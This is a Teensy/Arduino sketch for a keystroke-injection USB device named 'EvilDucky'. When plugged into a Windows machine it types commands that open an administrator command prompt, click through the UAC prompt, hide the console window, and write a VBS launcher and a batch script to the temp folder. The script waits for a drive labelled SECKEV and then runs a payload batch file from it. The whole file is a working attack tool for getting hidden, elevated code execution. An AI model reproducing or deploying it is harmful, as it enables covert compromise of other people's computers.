void setup()
{
  delay(5000);
  
  Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);
  Keyboard.send_now();
  
  delay(500);
  Keyboard.set_modifier(0);
  Keyboard.send_now();

  delay(500);
  Keyboard.print("powershell Start-Process cmd.exe -Verb runAs");
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();
  
  delay(500);
  Keyboard.set_key1(0);
  Keyboard.send_now();
  
  delay(1000);
  Keyboard.set_modifier(MODIFIERKEY_SHIFT);
  Keyboard.set_key1(KEY_TAB);
  Keyboard.send_now();
  
  delay(500);
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();
  
  delay(500);
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();
  Keyboard.set_key1(0);
  Keyboard.send_now();
  
  delay(500);
  Keyboard.println("mode con cols=14 lines=1");
  
  delay(500);
  Keyboard.println("cmd /c echo CreateObject(\"WScript.Shell\").Run \"%TEMP%\\wait.bat\",0,FALSE > %TEMP%\\ws.vbs");

  
  Keyboard.println("(echo @echo off");

  
  Keyboard.println("echo :while1");

  
  Keyboard.println("echo for /f \"tokens=3 delims= \" %%A in ^(\'echo list volume ^^^| diskpart ^^^| findstr \"SECKEV\"\'^) do ^(set EvilDuckydrive=%%A:^)");

  
  Keyboard.println("echo if [%EvilDuckydrive%] EQU [] ^(");

  
  Keyboard.println("echo 	echo Waiting on EvilDucky drive...");

  
  Keyboard.println("echo 	timeout /t 3");

  
  Keyboard.println("echo 	goto :while1");

  
  Keyboard.println("echo ^) else ^(");

  
  Keyboard.println("echo 	echo EvilDucky Drive Found!");

  
  Keyboard.println("echo 	goto :break");

  
  Keyboard.println("echo ^)");

  
  Keyboard.println("echo timeout /t 30");

  
  Keyboard.println("echo goto :while1");

  
  Keyboard.println("echo :break");

  
  Keyboard.println("echo echo This is where we execute the payload");

  
  Keyboard.println("echo start %EvilDuckydrive%\\EvilDucky\\demo.bat ) > %TEMP%\\wait.bat");

  
  Keyboard.println("cd %TEMP%");

  
  Keyboard.println("wscript ws.vbs");

  
  Keyboard.println("exit");
}

void loop()
{
}
